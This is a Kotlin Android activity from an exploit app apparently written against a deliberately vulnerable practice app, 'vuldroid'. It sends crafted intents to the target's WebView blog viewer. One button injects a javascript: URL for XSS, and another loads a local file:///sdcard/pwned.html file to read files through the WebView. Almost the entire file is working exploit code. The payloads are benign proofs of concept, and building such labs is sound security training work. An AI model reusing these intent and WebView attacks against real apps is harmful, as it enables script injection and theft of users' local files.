package vulndroid.exploit.app

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity

class BlogDeeplink : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.blog_exploits)

        // vuln exploited: WebView Link Param XSS
        val button5 = findViewById<View>(R.id.button5)
        button5.setOnClickListener {
            val xssIntent = Intent()
            xssIntent.action = "android.intent.action.VIEW"
            xssIntent.addCategory("android.intent.category.DEFAULT")
            xssIntent.addCategory("android.intent.category.BROWSABLE")
            xssIntent.putExtra("something", "extra") // needed to pass the check
            xssIntent.data = Uri.parse("https://medium.com?url=javascript:alert('javascript code exec, but not privileged');")
            xssIntent.setClassName(
                "com.vuldroid.application",
                "com.vuldroid.application.BlogsViewer"
            )
            startActivity(xssIntent)
        }

        // vuln exploited: Reading/Stealing Files via WebView
        val button6 = findViewById<View>(R.id.button6)
        button6.setOnClickListener {
            val blogIntent = Intent()
            blogIntent.action = "android.intent.action.VIEW"
            blogIntent.addCategory("android.intent.category.DEFAULT")
            blogIntent.addCategory("android.intent.category.BROWSABLE")
            blogIntent.putExtra("something", "extra") // needed to pass the check (?)
            blogIntent.data = Uri.parse("https://medium.com?url=file:///sdcard/pwned.html")
            blogIntent.setClassName(
                "com.vuldroid.application",
                "com.vuldroid.application.BlogsViewer"
            )
            Log.d("PWNAPP", "intent data: ${blogIntent.data}")
            startActivity(blogIntent)
        }
    }
}